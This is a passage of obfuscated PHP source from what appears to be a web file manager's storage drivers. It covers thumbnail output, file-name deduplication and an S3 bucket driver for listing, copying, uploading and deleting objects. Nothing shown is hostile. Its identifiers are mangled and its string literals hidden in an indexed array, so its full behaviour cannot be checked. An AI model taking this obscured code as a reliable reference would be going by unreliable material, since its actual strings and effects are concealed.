$Ë£Ğó²¸[8]) : $Ë£Ğó²¸[12]; $ğŒáòœÇ = $Ë£Ğó²¸[162] . $ËÔÆ˜¨¼ . $Ë£Ğó²¸[163] . rtrim($ñù›¦Èç, $Ë£Ğó²¸[8]); if (is_null($ËÔÆ˜¨¼)) { $Â‹ÇÛ«£ = array(); return; } if (is_null($ÌÖ˜ÇŸã)) { foreach ($Â‹ÇÛ«£ as $ğŒáòœÇ => $‰½Ì¿µ) { if (!strstr($ğŒáòœÇ, $Ë£Ğó²¸[162] . $ËÔÆ˜¨¼ . $Ë£Ğó²¸[164])) { continue; } unset($Â‹ÇÛ«£[$ğŒáòœÇ]); } return; } if (!is_null($ —§€)) { $Â‹ÇÛ«£[$ğŒáòœÇ] = $ —§€; return; } $Šƒ™·¸ = isset($Â‹ÇÛ«£[$ğŒáòœÇ]) ? $Â‹ÇÛ«£[$ğŒáòœÇ] : null; if (!is_null($Šƒ™·¸)) { return $Šƒ™·¸; } $Šƒ™·¸ = $this->{$ËÔÆ˜¨¼}($ÌÖ˜ÇŸã); $Â‹ÇÛ«£[$ğŒáòœÇ] = $Šƒ™·¸; return $Šƒ™·¸; } public function cacheMethodInfoSet($Òß¶Ûğ±, $ÏÃéÊÏî, $¹ü¦™ïõ = false) { $‹ª×¨õ =& $_SERVER[ßğøİ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($‹ª×¨õ[165], $Òß¶Ûğ±, $ÏÃéÊÏî); $this->cacheMethod($‹ª×¨õ[166], $Òß¶Ûğ±, $ÏÃéÊÏî ? !1 : !0); if (is_array($¹ü¦™ïõ)) { $this->cacheMethod($‹ª×¨õ[167], $Òß¶Ûğ±, $¹ü¦™ïõ); } } public function fileOutImage($ÑıÒ·åá, $é½ª‘É² = 250) { $ÁˆÕˆé§ =& $_SERVER[ßğøİ]; set_timeout(); if (substr($ÑıÒ·åá, 0, 4) == $ÁˆÕˆé§[148]) { $this->fileOutLink($ÑıÒ·åá); } $Ò©´ŒÜ× = $this->info($ÑıÒ·åá); $™Ñ‘åğÏ = $Ò©´ŒÜ×[$ÁˆÕˆé§[32]]; $¬•Ë•ç£ = !1; if (isset($GLOBALS[$ÁˆÕˆé§[168]]) && $GLOBALS[$ÁˆÕˆé§[168]][$ÁˆÕˆé§[84]] == $Ò©´ŒÜ×[$ÁˆÕˆé§[84]]) { $êı›ŞÊÔ = $GLOBALS[$ÁˆÕˆé§[168]][$ÁˆÕˆé§[169]]; if (!$Ò©´ŒÜ×[$ÁˆÕˆé§[170]]) { $Ò©´ŒÜ×[$ÁˆÕˆé§[170]] = $GLOBALS[$ÁˆÕˆé§[168]]; } if (isset($êı›ŞÊÔ[$ÁˆÕˆé§[171]])) { if ($êı›ŞÊÔ[$ÁˆÕˆé§[171]] <= $é½ª‘É² && $êı›ŞÊÔ[$ÁˆÕˆé§[172]] <= $é½ª‘É²) { $¬•Ë•ç£ = !0; } } $™Ñ‘åğÏ = $Ò©´ŒÜ×[$ÁˆÕˆé§[170]][$ÁˆÕˆé§[32]]; } if ($Ò©´ŒÜ×[$ÁˆÕˆé§[76]] <= 1024 * 50 || $¬•Ë•ç£ || !function_exists($ÁˆÕˆé§[173]) || $Ò©´ŒÜ×[$ÁˆÕˆé§[174]] == $ÁˆÕˆé§[175]) { return $this->fileOut($ÑıÒ·åá, !1, $™Ñ‘åğÏ); } if (isset($Ò©´ŒÜ×[$ÁˆÕˆé§[170]][$ÁˆÕˆé§[176]])) { $¬Âœ ”Ú = $Ò©´ŒÜ×[$ÁˆÕˆé§[170]][$ÁˆÕˆé§[176]]; } else { if (isset($Ò©´ŒÜ×[$ÁˆÕˆé§[170]][$ÁˆÕˆé§[177]])) { $¬Âœ ”Ú = $Ò©´ŒÜ×[$ÁˆÕˆé§[170]][$ÁˆÕˆé§[177]]; } } if (!$¬Âœ ”Ú) { $¬Âœ ”Ú = md5("{$Ò©´ŒÜ×[$ÁˆÕˆé§[32]]}\137{$Ò©´ŒÜ×[$ÁˆÕˆé§[84]]}\137{$Ò©´ŒÜ×[$ÁˆÕˆé§[76]]}\137{$é½ª‘É²}"); } $Ã½±™²Ñ = "{$¬Âœ ”Ú}\x5f{$é½ª‘É²}\56\160\156\147"; if (!($§›ŸçÏŠ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $ÁˆÕˆé§[178]))) { $ÒÂ–÷´š = IO::mkdir(IO_PATH_SYSTEM_TEMP . $ÁˆÕˆé§[179]); } else { $ÒÂ–÷´š = KodIO::make($§›ŸçÏŠ); } if ($§›ŸçÏŠ = IO::fileNameExist($ÒÂ–÷´š, $Ã½±™²Ñ)) { $šŠÊçí = KodIO::make($§›ŸçÏŠ); return IO::fileOut($šŠÊçí, !1, $™Ñ‘åğÏ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $šŠÊçí = DATA_THUMB . $Ã½±™²Ñ; del_file($šŠÊçí); if (!@file_exists($šŠÊçí)) { $èÂÀÃ = TEMP_FILES; if (!is_dir($èÂÀÃ)) { mk_dir($èÂÀÃ); } $¿Ü“¡Ğ· = $èÂÀÃ . $¬Âœ ”Ú . $ÁˆÕˆé§[10] . $Ò©´ŒÜ×[$ÁˆÕˆé§[174]]; if (!@file_exists($¿Ü“¡Ğ·)) { $¿Ü“¡Ğ· = $this->download($ÑıÒ·åá, $¿Ü“¡Ğ·); } ImageThumb::createThumb($¿Ü“¡Ğ·, $šŠÊçí, $é½ª‘É², $é½ª‘É² * 10); } if (!file_exists($šŠÊçí) || filesize($šŠÊçí) < 100) { return @file_exists($¿Ü“¡Ğ·) ? IO::fileOut($¿Ü“¡Ğ·) : $this->fileOut($ÑıÒ·åá); } if (!($†¾¾Šò = IO::move($šŠÊçí, $ÒÂ–÷´š))) { return IO::fileOut($šŠÊçí); } del_file($šŠÊçí); IO::fileOut($†¾¾Šò); } public function fileOutImageServer($óâ“ºñ, $ÌÏ®‚æì = 250) { $this->fileOutImage($óâ“ºñ, $ÌÏ®‚æì); } public function fileNameAuto($–‡øéÍ, $ì˜·¨ÂÔ, $òØ¾æ¸ü = REPEAT_RENAME, $÷®ªÖâ³ = false) { $„æ·ƒ–¢ =& $_SERVER[ßğøİ]; $…÷ŸÁ…Á = $–‡øéÍ === $„æ·ƒ–¢[12] ? $ì˜·¨ÂÔ : rtrim($–‡øéÍ, $„æ·ƒ–¢[8]) . $„æ·ƒ–¢[8] . $ì˜·¨ÂÔ; if ($òØ¾æ¸ü == REPEAT_REPLACE || !$this->exist($…÷ŸÁ…Á) || $÷®ªÖâ³ && $òØ¾æ¸ü != REPEAT_RENAME_FOLDER) { return $ì˜·¨ÂÔ; } if ($òØ¾æ¸ü == REPEAT_SKIP) { return !1; } $ïå×éÊÖ = $„æ·ƒ–¢[10] . get_path_ext($ì˜·¨ÂÔ); $ïå×éÊÖ = $ïå×éÊÖ == $„æ·ƒ–¢[10] || $÷®ªÖâ³ ? $„æ·ƒ–¢[12] : $ïå×éÊÖ; $Ÿƒ¿¢­ = 1; $‹¦•Á£Å = substr($ì˜·¨ÂÔ, 0, strlen($ì˜·¨ÂÔ) - strlen($ïå×éÊÖ)); $æ¡å­Ø¾ = $‹¦•Á£Å . "\x28{$Ÿƒ¿¢­}\51{$ïå×éÊÖ}"; while ($this->exist(rtrim($–‡øéÍ, $„æ·ƒ–¢[8]) . $„æ·ƒ–¢[8] . $æ¡å­Ø¾)) { $æ¡å­Ø¾ = $‹¦•Á£Å . "\50{$Ÿƒ¿¢­}\x29{$ïå×éÊÖ}"; $Ÿƒ¿¢­++; } return $æ¡å­Ø¾; } private function fileNameAutoList($“ìÄ¦ã£, $ğÄ¥‹¤°, $Ì¸¶‚ = false) { $µü¶É”Ø =& $_SERVER[ßğøİ]; $¼“±ñ°• = $this->listPath($“ìÄ¦ã£, !0); $¼“±ñ°• = array_merge($¼“±ñ°•[$µü¶É”Ø[82]], $¼“±ñ°•[$µü¶É”Ø[83]]); $Ô ëãşØ = array_to_keyvalue($¼“±ñ°•, $µü¶É”Ø[12], $µü¶É”Ø[32]); $ı× ”Ä¥ = $µü¶É”Ø[10] . get_path_ext($ğÄ¥‹¤°); $ı× ”Ä¥ = $ı× ”Ä¥ == $µü¶É”Ø[10] || $Ì¸¶‚ ? $µü¶É”Ø[12] : $ı× ”Ä¥; $ÖÊößå = substr($ğÄ¥‹¤°, 0, strlen($ğÄ¥‹¤°) - strlen($ı× ”Ä¥)); $ñ‡—şôö = $ÖÊößå . "\50\60\51{$ı× ”Ä¥}"; for ($¢ËÔ×¥È = 1; $¢ËÔ×¥È <= count($Ô ëãşØ) + 1; $¢ËÔ×¥È++) { $ñ‡—şôö = $ÖÊößå . "\x28{$¢ËÔ×¥È}\x29{$ı× ”Ä¥}"; if (!in_array_not_case($ñ‡—şôö, $Ô ëãşØ)) { return $ñ‡—şôö; } } return $ñ‡—şôö; } public function listAllFiles($¶Ã—¤…, $‡°ıš¡, $´Ê«÷Í— = array()) { $·Åº´æ¨ =& $_SERVER[ßğøİ]; if (empty($‡°ıš¡)) { return array(); } $ÈĞÁîøâ = array(); $¶Ã—¤… = trim($¶Ã—¤…, $·Åº´æ¨[8]); foreach ($‡°ıš¡ as $ìü¦ƒ–ˆ) { $Ö¢æÀÂ§ = ltrim(substr(trim($ìü¦ƒ–ˆ, $·Åº´æ¨[8]), strlen($¶Ã—¤…)), $·Åº´æ¨[8]); $ÈĞÁîøâ = array_merge($ÈĞÁîøâ, $this->slicePath($Ö¢æÀÂ§)); } $º¥ÁÕ÷• = array(); foreach (array_unique($ÈĞÁîøâ) as $ìü¦ƒ–ˆ) { $Ò¨ ÄÌÁ = array($·Åº´æ¨[84] => $this->getPathOuter($·Åº´æ¨[8] . $¶Ã—¤… . $·Åº´æ¨[8] . $ìü¦ƒ–ˆ), $·Åº´æ¨[75] => 1, $·Åº´æ¨[76] => 0); if (substr($ìü¦ƒ–ˆ, -1) != $·Åº´æ¨[8]) { $Ò¨ ÄÌÁ[$·Åº´æ¨[75]] = 0; $ë§‹¹Ó = $this->getPath($¶Ã—¤… . $·Åº´æ¨[8] . $ìü¦ƒ–ˆ); $Ò¨ ÄÌÁ[$·Åº´æ¨[76]] = isset($´Ê«÷Í—[$ë§‹¹Ó]) ? $´Ê«÷Í—[$ë§‹¹Ó] : $this->size($ë§‹¹Ó); } $º¥ÁÕ÷•[] = $Ò¨ ÄÌÁ; } return $º¥ÁÕ÷•; } public function slicePath($ìºù–Îå) { $àöÕøÇ‹ =& $_SERVER[ßğøİ]; $´—Úƒ‚ = explode($àöÕøÇ‹[8], trim($ìºù–Îå, $àöÕøÇ‹[8])); $«Èªş¡ı = 0; do { ++$«Èªş¡ı; $«óÉ€…õ[] = implode($àöÕøÇ‹[8], array_slice($´—Úƒ‚, 0, $«Èªş¡ı)) . $àöÕøÇ‹[8]; } while ($«Èªş¡ı < count($´—Úƒ‚)); $«óÉ€…õ[count($´—Úƒ‚) - 1] = $ìºù–Îå; return $«óÉ€…õ; } public function getHost() { $ØõËõİŒ =& $_SERVER[ßğøİ]; $ª£Á® = parse_url(trim($this->domain, $ØõËõİŒ[8])); $àæÕÃÙï = isset($ª£Á®[$ØõËõİŒ[180]]) ? $ª£Á®[$ØõËõİŒ[180]] : http_type(); $®•Åìü‹ = isset($ª£Á®[$ØõËõİŒ[181]]) ? $ª£Á®[$ØõËõİŒ[181]] : $ª£Á®[$ØõËõİŒ[84]]; if (isset($ª£Á®[$ØõËõİŒ[182]])) { $®•Åìü‹ .= $ØõËõİŒ[4] . $ª£Á®[$ØõËõİŒ[182]]; } return $àæÕÃÙï . $ØõËõİŒ[183] . $®•Åìü‹; } public function pathEncode($Ó¶Š›Û) { $Íù¥¥íè =& $_SERVER[ßğøİ]; return str_replace($Íù¥¥íè[184], $Íù¥¥íè[8], rawurlencode($Ó¶Š›Û)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($°‚ûÕÖ) { set_timeout(); require_once SDK_DIR . $_SERVER[ßğøİ][185]; parent::__construct(); $this->_init($°‚ûÕÖ); } public function _init($ËîŒ¸åá) { foreach ($ËîŒ¸åá as $œÉÓãú => $¸Ö’Øƒ) { if (isset($this->{$œÉÓãú})) { $this->{$œÉÓãú} = $¸Ö’Øƒ; } } $this->endpoint = $ËîŒ¸åá[$_SERVER[ßğøİ][186]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ù„Ñãøú = "\x76\x34") { $this->signVer = $ù„Ñãøú; $this->client->setSignatureVersion($ù„Ñãøú); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $”ª¥Ô±Ä =& $_SERVER[ßğøİ]; $äáŸ† = $this->getBucketCors(); if (!$äáŸ† || !is_array($äáŸ†)) { return !1; } if ($äáŸ†[$”ª¥Ô±Ä[187]] != $”ª¥Ô±Ä[188] || $äáŸ†[$”ª¥Ô±Ä[189]] != $”ª¥Ô±Ä[188]) { return !1; } $³„»§ş­ = array_map($”ª¥Ô±Ä[190], $äáŸ†[$”ª¥Ô±Ä[191]]); if (!is_array($³„»§ş­)) { $³„»§ş­ = array(); } $åó×–› = array($”ª¥Ô±Ä[192], $”ª¥Ô±Ä[193], $”ª¥Ô±Ä[194], $”ª¥Ô±Ä[195], $”ª¥Ô±Ä[196]); $øºµ¨‡ñ = array_diff($åó×–›, $³„»§ş­); return empty($øºµ¨‡ñ); } public function mkfile($Á½Èö¾ã, $ÈÉæáïÆ = '', $½èĞ…ªœ = REPEAT_RENAME) { $Ô×£‰Úù = $this->setContent($Á½Èö¾ã, $ÈÉæáïÆ); if ($Ô×£‰Úù !== !1) { return $this->getPathOuter($Á½Èö¾ã); } return !1; } public function mkdir($ì…ÎİŒø, $¹µØº®½ = REPEAT_SKIP) { $™¿©ÑÂú =& $_SERVER[ßğøİ]; if (empty($ì…ÎİŒø) && $ì…ÎİŒø !== $™¿©ÑÂú[197]) { return !1; } if ($¹µØº®½ && $this->_isFolder($ì…ÎİŒø)) { return $this->getPathOuter($ì…ÎİŒø); } $ÊÖÒ´» = $this->setContent($ì…ÎİŒø, $™¿©ÑÂú[12], !0); if ($ÊÖÒ´» !== !1) { return $this->getPathOuter($ì…ÎİŒø); } return !1; } public function copyFile($·ÄšÒµ‚, $ğ·œİ¤ª, $î·“ˆ•Š = array()) { $ãòŞØ‡ =& $_SERVER[ßğøİ]; $½öÚîÒ™ = $this->objectMeta($·ÄšÒµ‚); if (!$½öÚîÒ™) { return !1; } if ($½öÚîÒ™[$ãòŞØ‡[76]] <= 1024 * 1024 * 200) { $Êê‚İ‚ = $this->client->copyObject($this->bucket, $·ÄšÒµ‚, $this->bucket, $ğ·œİ¤ª, $ãòŞØ‡[198], $î·“ˆ•Š); } else { $Êê‚İ‚ = $this->client->multiCopyObject($this->bucket, $·ÄšÒµ‚, $this->bucket, $ğ·œİ¤ª, $î·“ˆ•Š); } $Êê‚İ‚ = $Êê‚İ‚ ? $this->getPathOuter($ğ·œİ¤ª) : !1; return $Êê‚İ‚; } public function moveFile($Ø½äª, $Áçó„û) { if ($this->copyFile($Ø½äª, $Áçó„û)) { $this->delFile($Ø½äª); return $this->getPathOuter($Áçó„û); } return !1; } public function delFile($¹à« ¯†) { return $this->client->deleteObject($this->bucket, $¹à« ¯†); } public function delFolder($ÖìÒÕ„¡) { $ÃÄ¡á³‹ =& $_SERVER[ßğøİ]; if (!$this->exist($ÖìÒÕ„¡)) { return !0; } $this->listItemCache = !1; $ŞÔ®õğş = $this->fileList($ÖìÒÕ„¡); $this->listItemCache = !0; $“õÇïÉ· = trim($ÖìÒÕ„¡, $ÃÄ¡á³‹[8]) . $ÃÄ¡á³‹[8]; if (!empty($ÖìÒÕ„¡) && $ÖìÒÕ„¡ !== $ÃÄ¡á³‹[197] && !in_array($“õÇïÉ·, $ŞÔ®õğş[$ÃÄ¡á³‹[82]])) { $ŞÔ®õğş[$ÃÄ¡á³‹[82]][] = $“õÇïÉ·; } $èâÊ¹“¯ = $this->delByBatch($ŞÔ®õğş[$ÃÄ¡á³‹[83]]); if (!$èâÊ¹“¯) { return !1; } $èâÊ¹“¯ = $this->delByBatch($ŞÔ®õğş[$ÃÄ¡á³‹[82]]); if (!$èâÊ¹“¯) { return !1; } return $this->delFile($“õÇïÉ·); } private function delByBatch($§œ²¸) { foreach (array_chunk($§œ²¸, 1000) as $á»³­Òå) { $½¥Ø‚ß² = $this->client->deleteObjects($this->bucket, $á»³­Òå); if (!$½¥Ø‚ß²) { return !1; } } return !0; } public function rename($«êÓ …ä, $Å£µ¨Ğå) { return $this->renameObject($«êÓ …ä, $Å£µ¨Ğå); } public function listPath($¯¤îÜŠş, $°ƒ”ùõæ = false) { $Ğ¡ı˜¯ =& $_SERVER[ßğøİ]; $ş¹¤œÌÊ = $this->fileList($¯¤îÜŠş, $Ğ¡ı˜¯[8], !0); foreach ($ş¹¤œÌÊ[$Ğ¡ı˜¯[82]] as $óıêßĞ => $ü´¢·ƒ) { $ş¹¤œÌÊ[$Ğ¡ı˜¯[82]][$óıêßĞ] = $this->folderInfo($ü´¢·ƒ, $°ƒ”ùõæ, $ü´¢·ƒ); } foreach ($ş¹¤œÌÊ[$Ğ¡ı˜¯[83]] as $óıêßĞ => $ü´¢·ƒ) { $ş¹¤œÌÊ[$Ğ¡ı˜¯[83]][$óıêßĞ] = $this->fileInfo($ü´¢·ƒ[$Ğ¡ı˜¯[32]], $°ƒ”ùõæ, $ü´¢·ƒ); } return $ş¹¤œÌÊ; } protected function infoChildren($½Ìó·¸, &$”™…¸¼Ô) { $‘ßèŒöµ =& $_SERVER[ßğøİ]; $éûš–Î£ = $this->fileList($½Ìó·¸, $‘ßèŒöµ[12], !0); $”™…¸¼Ô[$‘ßèŒöµ[78]] += count($éûš–Î£[$‘ßèŒöµ[82]]); $”™…¸¼Ô[$‘ßèŒöµ[77]] += count($éûš–Î£[$‘ßèŒöµ[83]]); foreach ($éûš–Î£[$‘ßèŒöµ[83]] as $ˆÁ€ò¿æ) { if (!$ˆÁ€ò¿æ || !$ˆÁ€ò¿æ[$‘ßèŒöµ[76]]) { continue; } $”™…¸¼Ô[$‘ßèŒöµ[76]] += $ˆÁ€ò¿æ[$‘ßèŒöµ[76]]; } } private function fileInfo($¿’Î¹ùğ, $€Ì§æ•· = false, $€Ê…­Ÿ = array()) { $ÖÎßÊ³â =& $_SERVER[ßğøİ]; $²Ñ‘ıÍ¿ = array($ÖÎßÊ³â[32] => $this->pathThis($¿’Î¹ùğ), $ÖÎßÊ³â[84] => $this->getPathOuter($¿’Î¹ùğ), $ÖÎßÊ³â[33] => $ÖÎßÊ³â[199], $ÖÎßÊ³â[174] => $this->ext($¿’Î¹ùğ), $ÖÎßÊ³â[76] => isset($€Ê…­Ÿ[$ÖÎßÊ³â[76]]) ? $€Ê…­Ÿ[$ÖÎßÊ³â[76]] : 0); if ($€Ì§æ•·) { return $²Ñ‘ıÍ¿; } $²Ñ‘ıÍ¿[$ÖÎßÊ³â[200]] = $²Ñ‘ıÍ¿[$ÖÎßÊ³â[85]] = 0; $²Ñ‘ıÍ¿[$ÖÎßÊ³â[201]] = $²Ñ‘ıÍ¿[$ÖÎßÊ³â[202]] = !0; if (empty($€Ê…­Ÿ)) { $€Ê…­Ÿ = $this->objectMeta($¿’Î¹ùğ); if (!$€Ê…­Ÿ) { return $²Ñ‘ıÍ¿; } } if (isset($€Ê…­Ÿ[$ÖÎßÊ³â[203]])) { $²Ñ‘ıÍ¿[$ÖÎßÊ³â[85]] = $€Ê…­Ÿ[$ÖÎßÊ³â[203]]; } if (isset($€Ê…­Ÿ[$ÖÎßÊ³â[76]])) { $²Ñ‘ıÍ¿[$ÖÎßÊ³â[76]] = $€Ê…­Ÿ[$ÖÎßÊ³â[76]]; } return $²Ñ‘ıÍ¿; } private function folderInfo($Æ×ı‘ô¼, $ñÔ°ÔÒï = false, $¦…º¢şØ = array()) { $©ı´–…­ =& $_SERVER[ßğøİ]; $Æ·õšÚİ = array($©ı´–…­[32] => $this->pathThis($Æ×ı‘ô¼), $©ı´–…­[84] => $this->getPathOuter($©ı´–…­[8] . $Æ×ı‘ô¼), $©ı´–…­[33] => $©ı´–…­[75]); if ($ñÔ°ÔÒï) { return $Æ·õšÚİ; } $Æ·õšÚİ[$©ı´–…­[200]] = $Æ·õšÚİ[$©ı´–…­[85]] = 0; $Æ·õšÚİ[$©ı´–…­[201]] = $Æ·õšÚİ[$©ı´–…­[202]] = !0; if ($Æ×ı‘ô¼ == $©ı´–…­[12]) { return $Æ·õšÚİ; } if (empty($¦…º¢şØ)) { $¦…º¢şØ = $this->objectMeta(trim($Æ×ı‘ô¼, $©ı´–…­[8]) . $©ı´–…­[8]); } if (isset($¦…º¢şØ[$©ı´–…­[203]])) { $Æ·õšÚİ[$©ı´–…­[200]] = $¦…º¢şØ[$©ı´–…­[203]]; } return $Æ·õšÚİ; } private function fileList($üø —, $ü™şÜáë = '', $êÅ™½ëİ = 0) { $íé›€Ñ =& $_SERVER[ßğøİ]; $€ü›Şı = rtrim($üø —, $íé›€Ñ[8]) . $íé›€Ñ[8]; $ÔÜÔŠÍ‹ = $this->listObjs($€ü›Şı, null, null, $ü™şÜáë); if (!$ÔÜÔŠÍ‹) { return array($íé›€Ñ[82] => array(), $íé›€Ñ[83] => array()); } $˜œŸò÷å = $±ÉÎšş– = array(); foreach ($ÔÜÔŠÍ‹[$íé›€Ñ[204]] as $â¡êêš) { $ì£«Åß‘ = $â¡êêš[$íé›€Ñ[32]]; if ($ì£«Åß‘ == $€ü›Şı) { continue; } $²˜á Ñ = isset($â¡êêš[$íé›€Ñ[76]]) ? $â¡êêš[$íé›€Ñ[76]] : 0; $ÔğÊ¡ = $²˜á Ñ == 0 && substr($ì£«Åß‘, strlen($ì£«Åß‘) - 1, 1) == $íé›€Ñ[8] ? !0 : !1; $this->cacheMethodInfoSet($ì£«Åß‘, $ÔğÊ¡, $â¡êêš); if ($ÔğÊ¡) { $˜œŸò÷å[] = $ì£«Åß‘; continue; } $±ÉÎšş–[] = $êÅ™½ëİ ? $â¡êêš : $ì£«Åß‘; } foreach ($ÔÜÔŠÍ‹[$íé›€Ñ[205]] as $â¡êêš) { $˜œŸò÷å[] = $â¡êêš[$íé›€Ñ[32]]; $this->cacheMethodInfoSet($â¡êêš[$íé›€Ñ[32]], !0); } $this->cacheMethodInfoSet($üø —, !0); return array($íé›€Ñ[82] => $˜œŸò÷å, $íé›€Ñ[83] => $±ÉÎšş–); } private function listObjs($å×±ĞØ, $¾€ú¯ñÄ = null, $ŒÍßïŠ = null, $ê€ı–‘  = null) { $ÔÂ¢É³ =& $_SERVER[ßğøİ]; $å×±ĞØ = trim($å×±ĞØ, $ÔÂ¢É³[8]); $²»¯€à = empty($å×±ĞØ) && $å×±ĞØ !== $ÔÂ¢É³[197] ? $ÔÂ¢É³[12] : $å×±ĞØ . $ÔÂ¢É³[8]; return $this->client->getBucket($this->bucket, $²»¯€à, $¾€ú¯ñÄ, $ŒÍßïŠ, $ê€ı–‘ , !0); } public function has($ëùßí†, $µïË²Ì¨ = false, $è¯È…Éá = true) { $£–Î‰ßß =& $_SERVER[ßğøİ]; $ëùßí† = trim($ëùßí†, $£–Î‰ßß[8]); $ÓĞ¢·Œ = empty($ëùßí†) && $ëùßí† !== $£–Î‰ßß[197] ? $£–Î‰ßß[12] : $ëùßí† . $£–Î‰ßß[8]; $ÂÏê“Æ€ = null; $×Ê¿Ë¯˜ = 500; $Ë“æùµØ = $£–Î‰ßß[8]; $ú¥ÚËØ× = $äí½Á›ğ = array(); while (!0) { $¦ê¶àÂ± = $this->listObjs($ëùßí†, $ÂÏê“Æ€, $×Ê¿Ë¯˜, $Ë“æùµØ); if (!$¦ê¶àÂ±) { break; } $ÂÏê“Æ€ = $¦ê¶àÂ±[$£–Î‰ßß[206]]; $â»œÌ« = $¦ê¶àÂ±[$£–Î‰ßß[204]]; $ª¿Ä®Öû = $¦ê¶àÂ±[$£–Î‰ßß[205]]; if (empty($â»œÌ«) && empty($ª¿Ä®Öû)) { break; } if (count($â»œÌ«) == 1 && $â»œÌ«[0][$£–Î‰ßß[32]] == $ÓĞ¢·Œ) { break; } if ($µïË²Ì¨) { if (count($â»œÌ«)) { $â»œÌ« = array_column($â»œÌ«, $£–Î‰ßß[32]); $ú¥ÚËØ× = array_merge($ú¥ÚËØ×, $â»œÌ«); } if (count($ª¿Ä®Öû)) { $ª¿Ä®Öû = array_column($ª¿Ä®Öû, $£–Î‰ßß[32]); $äí½Á›ğ = array_merge($äí½Á›ğ, $ª¿Ä®Öû); } if ($ÂÏê“Æ€ === null) { break; } continue; } if ($è¯È…Éá) { if (!empty($â»œÌ«)) { if (count($â»œÌ«) > 1 || isset($â»œÌ«[0][$£–Î‰ßß[32]]) && $â»œÌ«[0][$£–Î‰ßß[32]] != $ÓĞ¢·Œ) { return !0; } } } else { if (!empty($ª¿Ä®Öû)) { return !0; } } if ($ÂÏê“Æ€ === null) { break; } } if ($µïË²Ì¨) { $ú¥ÚËØ× = array_diff($ú¥ÚËØ×, array($ÓĞ¢·Œ)); $ú¥ÚËØ× = count(array_unique($ú¥ÚËØ×)); $äí½Á›ğ = count(array_unique($äí½Á›ğ)); return array($£–Î‰ßß[207] => $ú¥ÚËØ×, $£–Î‰ßß[208] => $äí½Á›ğ); } return !1; } public function listAll($ƒøóŸÁÑ) { $ÚË¦ñï¢ =& $_SERVER[ßğøİ]; $®ÖéØãÈ = $this->fileList($ƒøóŸÁÑ, $ÚË¦ñï¢[12], !0); $šÏã£ú· = array(); foreach ($®ÖéØãÈ[$ÚË¦ñï¢[83]] as $ŸÃÛ‰š) { $šÏã£ú·[$ŸÃÛ‰š[$ÚË¦ñï¢[32]]] = $ŸÃÛ‰š[$ÚË¦ñï¢[76]]; } foreach ($®ÖéØãÈ[$ÚË¦ñï¢[82]] as $ŸÃÛ‰š) { if (is_string($ŸÃÛ‰š)) { $šÏã£ú·[$ŸÃÛ‰š] = 0; } } return $this->listAllFiles($ƒøóŸÁÑ, array_keys($šÏã£ú·), $šÏã£ú·); } public function canRead($…·¢šÌË) { $ª‰œ­»â =& $_SERVER[ßğøİ]; $æÌıº±Š = $this->client->getAccessControlPolicy($this->bucket, $…·¢šÌË); if (!$æÌıº±Š) { return !1; } return in_array($æÌıº±Š, array($ª‰œ­»â[209], $ª‰œ­»â[210], $ª‰œ­»â[211])) ? !0 : !1; } public function canWrite($ÂèÕ†§ˆ) { $Ìç²öß =& $_SERVER[ßğøİ]; $ÒúìÑüÌ = $this->client->getAccessControlPolicy($this->bucket, $ÂèÕ†§ˆ); if (!$ÒúìÑüÌ) { return !1; } return in_array($ÒúìÑüÌ, array($Ìç²öß[209], $Ìç²öß[210])) ? !0 : !1; } public function getContent($ÂûŒÍ¶) { return $this->client->getObject($this->bucket, $ÂûŒÍ¶); } public function setContent($ßÇ…ÏŸ, $ä¡Èß±Ù = '', $Ò¯±“Ù“ = false) { $Àˆ©ÈÔË =& $_SERVER[ßğøİ]; $ßÇ…ÏŸ = $Ò¯±“Ù“ ? trim($ßÇ…ÏŸ, $Àˆ©ÈÔË[8]) . $Àˆ©ÈÔË[8] : $ßÇ…ÏŸ; $¦¨¥±úæ = get_file_mime(get_path_ext($ßÇ…ÏŸ)); $œÑşÉº¹ = $this->client->putObject($ä¡Èß±Ù, $this->bucket, $ßÇ…ÏŸ, $Àˆ©ÈÔË[198], array(), $¦¨¥±úæ); if (!$œÑşÉº¹) { return !1; } if ($Ò¯±“Ù“) { return !0; } $this->cacheMethod(null, null); $œÑşÉº¹ = $this->copyFile($ßÇ…ÏŸ, $ßÇ…ÏŸ, array($Àˆ©ÈÔË[212] => $œÑşÉº¹[$Àˆ©ÈÔË[213]])); return $œÑşÉº¹ ? !0 : !1; } public function fileSubstr($ó ›ö„, $µ°­“Äğ, $ÅĞÄÀË) { $ë‹‰µ“† = $µ°­“Äğ + $ÅĞÄÀË - 1; return $this->client->getObject($this->bucket, $ó ›ö„, array($_SERVER[ßğøİ][214] => "\142\171\164\145\163\75{$µ°­“Äğ}\55{$ë‹‰µ“†}")); } public function upload($‡ƒí–Ä¡, $À˜Ë€û, $ •ıû®ñ = false, $ÓøúêÇş = REPEAT_REPLACE) { $®Ğ©ö†” =& $_SERVER[ßğøİ]; $©¿É¤Ï = array($®Ğ©ö†”[212] => @md5_file($À˜Ë€û)); $Î÷Õıí¾ = array($®Ğ©ö†”[215] => get_file_mime(get_path_ext($‡ƒí–Ä¡))); if (IO::size($À˜Ë€û) <= 1024 * 1024 * 200) { $˜¦âÒ³— = $this->client->putObjectFile($À˜Ë€û, $this->bucket, $‡ƒí–Ä¡, $®Ğ©ö†”[198], $©¿É¤Ï, $Î÷Õıí¾); return !empty($˜¦âÒ³—) ? $this->getPathOuter($‡ƒí–Ä¡) : !1; } $ïÛ•Ê®÷ = $this->client->multiUploadObject($À˜Ë€û, $this->bucket, trim($‡ƒí–Ä¡, $®Ğ©ö†”[8]), $©¿É¤Ï, $Î÷Õıí¾); return $ïÛ•Ê®÷ ? $this->getPathOuter($‡ƒí–Ä¡) : !1; } public function download($¥Ä¦œó°, $õç•‚ªš) { if (!@is_dir($this->pathFather($õç•‚ªš)) && !IO::mkdir($this->pathFather($õç•‚ªš))) { return !1; } $ã‘´ºé‘ = $this->client->getObject($this->bucket, 